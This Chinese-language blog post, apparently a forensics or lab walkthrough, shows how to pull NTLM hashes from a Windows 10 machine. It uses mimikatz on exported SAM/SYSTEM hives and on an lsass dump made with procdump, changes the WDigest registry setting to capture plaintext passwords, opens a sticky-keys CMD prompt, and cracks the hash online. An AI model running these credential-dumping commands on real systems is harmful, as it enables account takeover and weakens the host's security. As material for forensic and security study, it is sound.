---
title: Windows10 获取密码
date: '2025-05-06 18:30:57'
updated: '2026-03-26 09:32:34'
abbrlink: 98c7cd20
---
<!--more--> 
# 0x01 获取NTML值
## 方法一
通过取证软件文件过滤出Windows注册表，需要导出SYSTEM和SAM两个文件。

选择恢复/复制，选择保存的路径即可。

![](../../images/posts/28d56f4a9041249396b2b3d6619082d3.png)

为了方便，将mimikatz放到同一个目录下。

![](../../images/posts/8c6a83704276fc884e909b9f7981dbc7.png)

在目录下启动CMD，运行mimkatz进行分析得到NTLM值。

```bash
mimikatz.exe "lsadump::sam /sam:SAM /system:SYSTEM" exit
```

![](../../images/posts/9bd03a758a56d262589cf0d4710677b4.png)

## 方法二
![](../../images/posts/06e96fcac46950ecc1d6266d5ab798b2.png)

![](../../images/posts/efaa19c4ccc5420b27f5c751e93d819d.png)

启动时按下F2，进入Boot Manager，选择CDROM启动。

![](../../images/posts/8af2a803deaa2f5e9d13070beeb8572c.png)

![](../../images/posts/f80345faee7f6c6c5e716b9dffb3995c.png)

![](../../images/posts/3927d87360d12bb201ece66917c98b56.png)

我们知道通过mimikatz获取密码的命令有：

```bash
# 直接提取
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
# 通过分析lsass
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::tspkg full" exit
```

当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。

```bash
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

但是这些都是在用户登录后的情况下。这里我们只能通过分析SAM拿到

```bash
cd C:\x64
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

打开虚拟机后，shift按5次后弹出CMD，输入命令后可以获得NTLM值，注意看是不是500，如果不是，那不是管理员的NTLM。

![](../../images/posts/c1adfe6be7f457f11c08a48b83981da9.png)

# 0x02 查询密码网站
1. [https://crackstation.net/](https://crackstation.net/)
2. [https://www.somd5.com/](https://www.somd5.com/)
3. [https://cmd5.com/](https://cmd5.com/)



将该NTLM拿去网站查询，可以得到密码：jlb654321

![](../../images/posts/ef25dfb5d1ae62b4a3097d8d48f12b66.png)

# 参考
1. [[后渗透]Mimikatz使用大全 - 肖洋肖恩、 - 博客园](https://www.cnblogs.com/-mo-/p/11890232.html)
2. [使用mimikatz获取windows密码凭证_mimikatz获取windows凭据-CSDN博客](https://blog.csdn.net/cuteyann/article/details/130732849)



